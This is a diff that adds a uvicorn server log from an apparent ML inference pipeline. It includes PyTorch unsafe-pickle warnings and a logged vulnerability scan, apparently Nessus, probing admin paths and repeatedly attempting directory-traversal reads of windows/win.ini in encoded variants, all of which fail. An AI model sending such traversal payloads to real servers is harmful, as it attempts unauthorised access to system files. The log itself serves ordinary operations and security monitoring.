@@ -1,0 +1,1754 @@
+/nuvodata/User_data/neeraj/tavivision/inference_pipeline/valve_classification.py:76: FutureWarning: You are using `torch.load` with `weights_only=False` (the current default value), which uses the default pickle module implicitly. It is possible to construct malicious pickle data which will execute arbitrary code during unpickling (See https://github.com/pytorch/pytorch/blob/main/SECURITY.md#untrusted-models for more details). In a future release, the default value for `weights_only` will be flipped to `True`. This limits the functions that could be executed during unpickling. Arbitrary objects will no longer be allowed to be loaded via this mode unless they are explicitly allowlisted by the user via `torch.serialization.add_safe_globals`. We recommend you start setting `weights_only=True` for any use case where you don't have full control of the loaded file. Please open an issue on GitHub for any issues related to this experimental feature.
+  self.model_stage1.load_state_dict(torch.load(stage1_path, map_location=self.device))
+/nuvodata/User_data/neeraj/tavivision/inference_pipeline/valve_classification.py:77: FutureWarning: You are using `torch.load` with `weights_only=False` (the current default value), which uses the default pickle module implicitly. It is possible to construct malicious pickle data which will execute arbitrary code during unpickling (See https://github.com/pytorch/pytorch/blob/main/SECURITY.md#untrusted-models for more details). In a future release, the default value for `weights_only` will be flipped to `True`. This limits the functions that could be executed during unpickling. Arbitrary objects will no longer be allowed to be loaded via this mode unless they are explicitly allowlisted by the user via `torch.serialization.add_safe_globals`. We recommend you start setting `weights_only=True` for any use case where you don't have full control of the loaded file. Please open an issue on GitHub for any issues related to this experimental feature.
+  self.model_stage2.load_state_dict(torch.load(stage2_path, map_location=self.device))
+INFO:     Started server process [2502851]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+ERROR:    [Errno 98] error while attempting to bind on address ('0.0.0.0', 8000): address already in use
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+Initializing YOLO model on cuda:0
+YOLO model loaded successfully.
+/nuvodata/User_data/neeraj/tavivision/inference_pipeline/valve_classification.py:76: FutureWarning: You are using `torch.load` with `weights_only=False` (the current default value), which uses the default pickle module implicitly. It is possible to construct malicious pickle data which will execute arbitrary code during unpickling (See https://github.com/pytorch/pytorch/blob/main/SECURITY.md#untrusted-models for more details). In a future release, the default value for `weights_only` will be flipped to `True`. This limits the functions that could be executed during unpickling. Arbitrary objects will no longer be allowed to be loaded via this mode unless they are explicitly allowlisted by the user via `torch.serialization.add_safe_globals`. We recommend you start setting `weights_only=True` for any use case where you don't have full control of the loaded file. Please open an issue on GitHub for any issues related to this experimental feature.
+  self.model_stage1.load_state_dict(torch.load(stage1_path, map_location=self.device))
+/nuvodata/User_data/neeraj/tavivision/inference_pipeline/valve_classification.py:77: FutureWarning: You are using `torch.load` with `weights_only=False` (the current default value), which uses the default pickle module implicitly. It is possible to construct malicious pickle data which will execute arbitrary code during unpickling (See https://github.com/pytorch/pytorch/blob/main/SECURITY.md#untrusted-models for more details). In a future release, the default value for `weights_only` will be flipped to `True`. This limits the functions that could be executed during unpickling. Arbitrary objects will no longer be allowed to be loaded via this mode unless they are explicitly allowlisted by the user via `torch.serialization.add_safe_globals`. We recommend you start setting `weights_only=True` for any use case where you don't have full control of the loaded file. Please open an issue on GitHub for any issues related to this experimental feature.
+  self.model_stage2.load_state_dict(torch.load(stage2_path, map_location=self.device))
+INFO:     Started server process [2503798]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+INFO:     Uvicorn running on http://0.0.0.0:8080 (Press CTRL+C to quit)
+Initializing YOLO model on cuda:0
+YOLO model loaded successfully.
+INFO:     127.0.0.1:52056 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52056 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     192.168.31.2:50726 - "GET / HTTP/1.0" 200 OK
+INFO:     192.168.31.2:46298 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46306 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46308 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46320 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46326 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46340 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46348 - "OPTIONS / HTTP/1.1" 405 Method Not Allowed
+INFO:     192.168.31.2:46360 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46370 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46374 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46382 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46378 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46390 - "GET /play HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46404 - "GET /ajax-api/2.0/mlflow/registered-models/search?order_by=name+ASC HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:46394 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:46418 - "GET /info HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:47188 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:47196 - "GET /login/?next=/ HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     192.168.31.2:52850 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:52866 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:52870 - "GET /api/hpe-restapi.json HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     192.168.31.2:48122 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:48136 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:48150 - "GET /properties/description.dhtml HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48166 - "GET /properties/configuration.php?tab=Status HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48182 - "GET /header.php?tab=status HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48200 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:48208 - "GET /aboutprinter.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48220 - "GET /properties/configuration.php?tab=Status HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:33026 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:33040 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:48088 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:48090 - "GET /login.php HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48092 - "GET /this_server/all_settings.shtml HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48104 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:48104 - "GET /authenticate/login HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48112 - "GET /start.js HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48126 - "GET /tmui/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48128 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48138 - "GET /netmri/config/userAdmin/login.tdf HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48144 - "GET /scgi-bin/platform.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48150 - "GET /admin/login.do HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48162 - "GET /en/main.js HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48176 - "GET /mgmt/login?dest=%2Fmgmt%2Fgui%3Fp%3Dhome&reason=&username= HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48180 - "GET /dms2/Login.jsp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48196 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48210 - "GET /home.htm HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48224 - "GET /sws/data/sws_data.js HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48238 - "GET /wcd/system.xml HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48240 - "GET /js/Device.js HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48246 - "GET /ptz.htm HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48258 - "GET /admin/login.jsp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48264 - "GET /loginMsg.js HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     192.168.31.2:48298 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:48306 - "GET /login.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48314 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:48330 - "GET /Home.do HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     192.168.31.2:48358 - "GET http%3A//rfi.nessus.org/check_proxy.html HTTP/1.0" 404 Not Found
+INFO:     192.168.31.2:48360 - "GET http%3A//www.%24%24%24%24%24 HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48362 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:48376 - "GET /admin_ui/mas/ent/login.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48388 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:48398 - "GET // HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48406 - "GET /intruvert/jsp/admin/Login.jsp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48444 - "GET /commoncgi/servlet/CCGIServlet?ApHost=PDT_InterScan_NT&CGIAlias=PDT_InterScan_NT&File=logout.htm HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48460 - "GET /xmldata?item=All HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48466 - "GET /upnp/BasicDevice.xml HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48472 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:48484 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:48490 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48504 - "GET /sitemap.xml HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48514 - "GET /.cobalt HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48518 - "GET /admin.back HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48524 - "GET /file HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48540 - "GET /wavemaster.internal HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48552 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:48562 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:48564 - "NTMQHJ / HTTP/1.1" 405 Method Not Allowed
+INFO:     192.168.31.2:51556 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51560 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51574 - "GET /MSWSMTP/Common/Authentication/Logon.aspx HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51580 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51590 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51598 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51604 - "OPTIONS / HTTP/1.1" 405 Method Not Allowed
+INFO:     192.168.31.2:51624 - "GET /0WD5XWbCLSBH.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51638 - "GET /0WD5XWbCLSBH.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51654 - "GET /0WD5XWbCLSBH.sh HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51656 - "GET /0WD5XWbCLSBH.pl HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51672 - "GET /0WD5XWbCLSBH.inc HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51682 - "GET /0WD5XWbCLSBH.shtml HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51686 - "GET /0WD5XWbCLSBH.asp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51694 - "GET /0WD5XWbCLSBH.php HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51702 - "GET /0WD5XWbCLSBH.php3 HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51708 - "GET /0WD5XWbCLSBH.cfm HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51720 - "GET /cgi-bin/0WD5XWbCLSBH.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51724 - "GET /cgi-bin/0WD5XWbCLSBH.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51740 - "GET /cgi-bin/0WD5XWbCLSBH.sh HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51752 - "GET /cgi-bin/0WD5XWbCLSBH.pl HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51758 - "GET /cgi-bin/0WD5XWbCLSBH.inc HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51772 - "GET /cgi-bin/0WD5XWbCLSBH.shtml HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51780 - "GET /cgi-bin/0WD5XWbCLSBH.asp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51792 - "GET /cgi-bin/0WD5XWbCLSBH.php HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51794 - "GET /cgi-bin/0WD5XWbCLSBH.php3 HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51802 - "GET /cgi-bin/0WD5XWbCLSBH.cfm HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51816 - "GET /scripts/0WD5XWbCLSBH.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51828 - "GET /scripts/0WD5XWbCLSBH.cgi HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51840 - "GET /scripts/0WD5XWbCLSBH.sh HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51846 - "GET /scripts/0WD5XWbCLSBH.pl HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51848 - "GET /scripts/0WD5XWbCLSBH.inc HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51860 - "GET /scripts/0WD5XWbCLSBH.shtml HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51864 - "GET /scripts/0WD5XWbCLSBH.asp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51880 - "GET /scripts/0WD5XWbCLSBH.php HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51896 - "GET /scripts/0WD5XWbCLSBH.php3 HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51900 - "GET /scripts/0WD5XWbCLSBH.cfm HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51926 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51940 - "GET /ext-js/app/common/zld_product_spec.js HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:51954 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51966 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51974 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:51986 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:52002 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:52012 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     192.168.31.2:48338 - "TRACE /Nessus1079329888.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48342 - "TRACK /Nessus1079329888.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48344 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:48354 - "GET /xampp/index.php HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48360 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:48364 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:48368 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:48380 - "GET /Wsusadmin/Errors/BrowserSettings.aspx HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48412 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:48428 - "GET /nessus345678.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48434 - "GET /nessus345678.html HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48466 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48472 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:48484 - "GET /SnoopServlet/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48490 - "GET /snoopservlet/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48502 - "GET /snoop/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48516 - "GET /servlet/SnoopServlet/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48532 - "GET /servlet/snoopservlet/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48540 - "GET /servlet/snoop/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48542 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:48544 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48546 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:48550 - "GET /triton-help/en/first.htm HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48560 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:48568 - "GET /console/login/LoginForm.jsp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48578 - "GET /wls-wsat/CoordinatorPortType HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48580 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:48586 - "SEARCH / HTTP/1.1" 405 Method Not Allowed
+INFO:     192.168.31.2:48590 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:48598 - "OPTIONS %2A HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48610 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:48626 - "PROPFIND / HTTP/1.1" 405 Method Not Allowed
+INFO:     192.168.31.2:48642 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:48658 - "GET /active.log HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48660 - "GET /usage/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48668 - "GET /webalizer/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48674 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:48682 - "GET /images HTTP/1.0" 404 Not Found
+INFO:     192.168.31.2:48684 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:48700 - "GET /main_internet.php HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48714 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:48716 - "GET /auth/login HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48730 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:48734 - "GET /cfg/shortcuts HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48750 - "GET /hc/error/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48760 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:48768 - "GET /ui/login.action HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48790 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:48800 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48802 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:48806 - "GET /hc/admin/login/ HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48816 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:48826 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48830 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:48836 - "GET /qip HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:48838 - "GET /qip HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49286 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:49300 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:49304 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:49312 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:49322 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:49326 - "GET /portal/diag/index.jsp HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49338 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:49350 - "GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49358 - "GET /../../../../../../../../../../../../winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49372 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:49388 - "GET ../../../../../../../../../../../../windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49404 - "GET ../../../../../../../../../../../../winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49414 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:49420 - "GET ..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49424 - "GET ..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwinnt%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49440 - "GET /..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49454 - "GET /..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwinnt%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49468 - "GET /%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49474 - "GET /%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwinnt%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49478 - "GET /%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49494 - "GET /%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwinnt%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49502 - "GET //../../../../../../../../../windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49504 - "GET //../../../../../../../../../winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49518 - "GET /.%7C./.%7C./.%7C./.%7C./.%7C./.%7C./.%7C./.%7C./.%7C./.%7C./.%7C./windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49530 - "GET /.%7C./.%7C./.%7C./.%7C./.%7C./.%7C./.%7C./.%7C./.%7C./.%7C./.%7C./winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49536 - "GET /../../../../../../../../../../../windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49552 - "GET /../../../../../../../../../../../winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49556 - "GET /..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49568 - "GET /..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwinnt%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49576 - "GET /..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49588 - "GET %5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwinnt%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49598 - "GET /.../.../.../.../.../.../.../.../.../windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49606 - "GET /.../.../.../.../.../.../.../.../.../winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49608 - "GET /...%5C...%5C...%5C...%5C...%5C...%5C...%5C...%5C...%5Cwindows%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49612 - "GET /...%5C...%5C...%5C...%5C...%5C...%5C...%5C...%5C...%5Cwinnt%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49626 - "GET /..../..../..../..../..../..../..../..../..../windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49640 - "GET /..../..../..../..../..../..../..../..../..../winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49644 - "GET /....%5C....%5C....%5C....%5C....%5C....%5C....%5C....%5C....%5Cwindows%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49646 - "GET /....%5C....%5C....%5C....%5C....%5C....%5C....%5C....%5C....%5Cwinnt%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49652 - "GET /././././././../../../../../windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49654 - "GET /././././././../../../../../winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49666 - "GET .%5C.%5C.%5C.%5C.%5C.%5C.%5C.%5C.%5C.%5C/windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49672 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:49680 - "GET .%5C.%5C.%5C.%5C.%5C.%5C.%5C.%5C.%5C.%5C/winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49682 - "GET / HTTP/1.1" 200 OK
+INFO:     192.168.31.2:49696 - "GET /nessus%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49704 - "GET /nessus%5C..%5C..%5C..%5C..%5C..%5C..%5Cwinnt%5Cwin.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49706 - "GET /%EF%BF%BD../%EF%BF%BD../%EF%BF%BD../%EF%BF%BD../%EF%BF%BD../%EF%BF%BD../windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49720 - "GET /%EF%BF%BD../%EF%BF%BD../%EF%BF%BD../%EF%BF%BD../%EF%BF%BD../%EF%BF%BD../winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49736 - "GET /%EF%BF%BD.%EF%BF%BD./%EF%BF%BD.%EF%BF%BD./%EF%BF%BD.%EF%BF%BD./%EF%BF%BD.%EF%BF%BD./%EF%BF%BD.%EF%BF%BD./windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49744 - "GET /%EF%BF%BD.%EF%BF%BD./%EF%BF%BD.%EF%BF%BD./%EF%BF%BD.%EF%BF%BD./%EF%BF%BD.%EF%BF%BD./%EF%BF%BD.%EF%BF%BD./winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49758 - "GET /%EF%BF%BD.%EF%BF%BD./%EF%BF%BD.%EF%BF%BD./%EF%BF%BD.%EF%BF%BD./%EF%BF%BD.%EF%BF%BD./windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49766 - "GET /%EF%BF%BD.%EF%BF%BD./%EF%BF%BD.%EF%BF%BD./%EF%BF%BD.%EF%BF%BD./%EF%BF%BD.%EF%BF%BD./winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49780 - "GET /%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49782 - "GET /%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/%25uff0e%25uff0e/winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49794 - "GET /scripts/fake.cgi?arg=/dir/../../../../../../../../../../../windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49806 - "GET /scripts/fake.cgi?arg=/dir/../../../../../../../../../../../winnt/win.ini HTTP/1.1" 404 Not Found
+INFO:     192.168.31.2:49812 - "GET /scripts/fake.cgi?arg=/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1" 404 Not Found
